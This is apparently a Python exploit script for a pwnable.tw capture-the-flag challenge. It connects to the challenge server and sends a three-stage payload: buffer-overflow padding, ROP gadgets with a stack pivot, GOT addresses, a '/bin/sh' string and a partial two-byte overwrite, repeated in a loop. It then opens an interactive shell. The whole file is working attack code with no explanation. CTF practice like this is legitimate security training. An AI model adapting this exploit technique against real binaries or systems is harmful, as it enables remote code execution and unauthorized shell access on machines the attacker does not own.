from PwnIOI import *
import time
while 1:
  #s = IOI(['192.168.0.85',9999])
  s = IOI(['chall.pwnable.tw',10403])
  gadget1 = 0x000000000040050e # add esp, 8 ; pop rbx ; pop rbp ; ret
  gadget2 = 0x0000000000400512 # pop rbp ; ret
  stage1 = "A"*0x10
  stage1 += p64(0x601018+0x10)
  stage1 += p64(0x0040055B)
  time.sleep(3)
  s.write(stage1)
  stage2 = p64(gadget1)
  stage2 += '/bin/sh\x00'
  stage2 += p64(0x601010)
  stage2 += p64(0x0040055B)
  stage2 += p64(gadget1)
  stage2 += p64(0)*3
  stage2 += p64(0x0400450)
  stage2 += '/bin/sh\x00'
  time.sleep(0.2)
  s.write(stage2)
  stage3 = "A"*0x10
  stage3 += '\x3a\xbc'
  time.sleep(0.2)
  s.write(stage3)
  s.interact()
